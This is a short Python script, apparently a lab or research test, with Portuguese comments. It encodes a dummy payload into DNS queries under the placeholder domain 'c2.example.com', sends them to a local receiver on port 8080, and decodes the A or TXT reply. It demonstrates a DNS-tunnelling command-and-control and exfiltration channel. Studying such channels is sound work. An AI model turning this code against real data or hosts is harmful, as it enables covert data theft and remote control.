import sys
from DNS_Research import encode, dns_query, send_udp, parse_minimal_response
import socket  

data = b"teste de payload"
domain = "c2.example.com"

fqdns = encode(data, domain)
print(f"[*] Enviando query: {fqdns[0]}")

# Manda o pacote pro receiver na 8080
packet = dns_query(fqdns[0], "TXT")
response = send_udp(packet, server="127.0.0.1", port=8080)

print(f"[+] Resposta recebida ({len(response)} bytes)")                                  
result = parse_minimal_response(response)                                                 
if result and result["type"] == 1:                                                                                                                                 
    ip = socket.inet_ntoa(result["rdata"])                                                
    print(f"[+] IP retornado pelo Receiver: {ip}")

elif result and result["type"] == 16:
    txt_len = result["rdata"][0]
    txt_msg = result["rdata"][1:1 + txt_len].decode("ascii", errors="replace")
    print(f"[+] Um total de {txt_len} Bytes recebidos")
    print(f"[+] Mensagem recebida: \n {txt_msg}")